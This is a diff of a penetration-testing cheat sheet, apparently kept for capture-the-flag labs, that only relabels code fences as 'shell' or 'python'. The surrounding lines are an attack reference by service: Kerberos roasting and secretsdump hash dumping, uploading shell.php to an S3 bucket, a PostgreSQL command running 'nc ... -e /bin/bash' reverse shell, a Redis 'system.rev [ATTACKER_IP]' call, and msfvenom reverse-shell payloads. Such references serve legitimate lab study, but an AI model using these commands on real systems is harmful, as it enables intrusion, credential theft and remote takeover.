@@ -19,7 +19,7 @@ nmap -sC -sV -A -p- -v [IP_ADDR]
 
 #### FTP (21)
 
-```
+```shell
 ftp [IP_ADDR]
 anonymous sign in
 put [FILE]    # Try for file upload
@@ -27,7 +27,7 @@ put [FILE]    # Try for file upload
 
 #### SSH (22)
 
-```
+```shell
 ssh [USERNAME]@[IP_ADDR] [PORT]
 ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -o Ciphers=aes256-cbc [IP_ADDR]
 ssh [USERNAME]@[IP_ADDR] -i id_rsa    # chmod 600 id_rsa
@@ -58,7 +58,7 @@ Source: https://d00mfist.gitbooks.io/ctf/content/list\_of\_common\_ports.html
 
 #### DNS (53)
 
-```
+```shell
 dig axfr [DOMAIN].[TLD] @[IP_ADDR]
 dig @[IP_ADDR] -x [IP_ADDR]
 nslookup [IP_ADDR]
@@ -70,7 +70,7 @@ nslookup [IP_ADDR]
 
 #### HTTP (80) / HTTPS (443)
 
-```
+```shell
 gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
 ffuf -u http://[IP_ADDR]/ -H "Host: FUZZ.[DOMAIN]" -w /seclists/Discovery/DNS/shubs-subdomains.txt -t 100 -fl 10
 nikto -h [URL]
@@ -84,7 +84,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   # 
 
 #### Kerberos (88)
 
-```
+```shell
 kerbrute userenum --dc [DOMAIN] -d [DOMAIN] [WORDLIST]    # enum user
 GetNPUsers.py [DOMAIN]/[USERNAME] -request -no-pass -dc-ip [IP_ADDR]    # get user that does not require kerberos preauth
 secretsdump.py -dc-ip [IP_ADDR] [DOMAIN].local/[USERNAME]:[PASSWORD]@[IP_ADDR]    # retrieve all of the password hashes
@@ -94,13 +94,13 @@ Ref: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.
 
 #### SNMP (161 UDP)
 
-```
+```shell
 snmpwalk -v 2c [IP_ADDR] -c public > [OUTFILE]
 ```
 
 #### POP3 (110 & 995)
 
-```
+```shell
 telnet [IP_ADDR] [PORT]
 USER [USERNAME]
 PASS [PASSWORD]
@@ -111,14 +111,14 @@ quit
 
 #### Network File System (111 & 2049)
 
-```
+```shell
 showmount -e [IP_ADDR]
 mount -t nfs [IP_ADDR]:/[Remote_Folder] [Local_Folder]/
 ```
 
 #### LDAP (389 & 636)
 
-```
+```shell
 ldapsearch -H ldap://[IP_ADDR] -x
 ldapsearch -H ldap://[IP_ADDR] -x -s base namingcontexts
 ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb DC=local"
@@ -131,7 +131,7 @@ GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -no-pass -userfiles userna
 
 #### SMB (445)
 
-```
+```shell
 smbclient -L [IP_ADDR]    # To list out available directories
 smbclient \\\\[IP_ADDR]\\[DIRECTORY]    # To show directory content
 smbclient \\\\[IP_ADDR]\\[DIRECTORY] -U [DOMAIN]/[USERNAME]    # Sign in with username
@@ -147,7 +147,7 @@ enum4linux -a [IP_ADDR]
 
 MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016 SMB share folder mounting
 
-```
+```shell
 mkdir /mnt/[FOLDER_NAME]
 mount -t cifs -o username=[USERNAME] //[IP_ADDR]/[SHARED_PATH] /mnt/[FOLDER_NAME]
 ```
@@ -156,7 +156,7 @@ Mounting VHD file Ref: https://www.how2shout.com/linux/mount-virtual-hard-disk-v
 
 #### Rsync (873)
 
-```
+```shell
 rsync -rdt rsync://[IP_ADDR]
 rsync -av [MODULE]@[IP_ADDR]::[MODULE]/ .   # Download
 rsync -avp [LOCAL DIRECTORY] [MODULE]@[IP_ADDR]::[REMOTE DIRECTORY]/    # Upload
@@ -164,7 +164,7 @@ rsync -avp [LOCAL DIRECTORY] [MODULE]@[IP_ADDR]::[REMOTE DIRECTORY]/    # Upload
 
 #### Microsoft SQL (1433)
 
-```
+```shell
 impacket-mssqlclient [DOMAIN]/[USERNAME]@[IP_ADDR] -windows-auth    # Connect to mssql server
 SELECT IS_SRVROLEMEMBER('sysadmin')   # Check for sysadmin privileage; return 1 for true, 0 for false
 SELECT name FROM master.dbo.sysdatabases    # Retrieve list of databases
@@ -177,7 +177,7 @@ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
 
 #### MySQL (3306)
 
-```
+```shell
 mysql -u [USERNAME] -h [IP_ADDR] -p   # Connect to mysql server
 mysql -u [USERNAME] -h [IP_ADDR] -p -e 'SHOW DATABASES;'
 mysql -u [USERNAME] -h [IP_ADDR] -p -e 'USE [DATABASE]; SHOW TABLES;'
@@ -188,7 +188,7 @@ https://www.exploit-db.com/exploits/1518
 
 #### RDP (3389)
 
-```
+```shell
 rdesktop -u -r clipboard:CLIPBOARD [USERNAME] [IP_ADDR]:[PORT]
 xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
 . \\tsclient\share\   # in powershell to access the files in /tmp
@@ -196,7 +196,7 @@ xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynam
 
 #### Postgresql (5432)
 
-```
+```shell
 psql -U [USERNAME] -p [PORT] -h [HOST]    # default postgres:postgres
 \l    # list databases
 select pg_ls_dir('/home/');
@@ -219,7 +219,7 @@ postgres=# COPY cmd_exec FROM PROGRAM 'nc 192.168.49.52 80 -e /bin/bash';
 
 #### Redis (6379)
 
-```
+```shell
 redis-cli -h [IP]   # without auth
 redis-cli -h [IP] -a [PASSWORD]   # auth required
 ----------
@@ -238,7 +238,7 @@ system.rev [ATTACKER_IP] [PORT]
 
 #### Apache Tomcat (8080)
 
-```
+```shell
 Default page:
 /admin
 /manager
@@ -264,7 +264,7 @@ db.[COLLECTIONS].find()
 
 ## Working with MSFVENOM and MSFCONSOLE
 
-```
+```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [asp/aspx/php/filetype] > [OUTPUT_FILE.asp/aspx/php/filetype]
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.74 LPORT=21 -f msi> evil.msi
@@ -315,7 +315,7 @@ Ref: https://hashcat.net/wiki/doku.php?id=example\_hashes
 
 ### Python
 
-```
+```python
 python3 'import pty;pty.spawn("/bin/bash");'
 ```
 
